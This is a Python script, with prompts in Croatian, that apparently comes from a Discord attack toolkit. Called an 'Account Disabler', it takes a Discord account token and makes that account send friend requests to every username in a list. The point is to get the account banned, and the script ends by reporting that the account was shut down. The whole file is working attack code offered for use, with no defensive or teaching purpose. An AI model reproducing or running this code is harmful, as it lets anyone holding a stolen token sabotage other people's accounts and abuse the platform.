import requests
import os
from colorama import Fore
from util.plugins.commun import * 

setTitle("Account Disabler")
clear()
accountdisablertitle()

def disable():
    print(f"""{y}[>{y}]{m} UPISI TOKEN ACC-a KOJEG ZELIS DISABLE""")
    usertoken = str(input(f"""{y}[--->{y}]{m} TOKEN: """))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"\n{y}[{Fore.LIGHTCYAN_EX }>{y}]{m} KORISNICKI DETAILS: {res['username']}#{res['discriminator']} - ({res['id']})")
    input(f"{y}[--->{y}]{m} AKO SU DETAILS TOCNI PRITISNI ENTER")
    print()
    for username in open('util/11_AccountDisabler/users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print(f"\t{y}[{Fore.LIGHTCYAN_EX }>{y}]{m} {usr[0]}--->{usr[1]} DODANO!")
        except:
            print(f"{y}[{Fore.LIGHTCYAN_EX }>{y}]{m} NESTO JE KRIVO!")
    print(f"\n\n{y}[{Fore.LIGHTCYAN_EX }>{y}]{m} ACCOUNT JE USPJESNO UGASEN!")
    input(f"""\n{y}[--->{y}]{m} PRITISNI ENTER DA IZADJES""")
    main()

disable()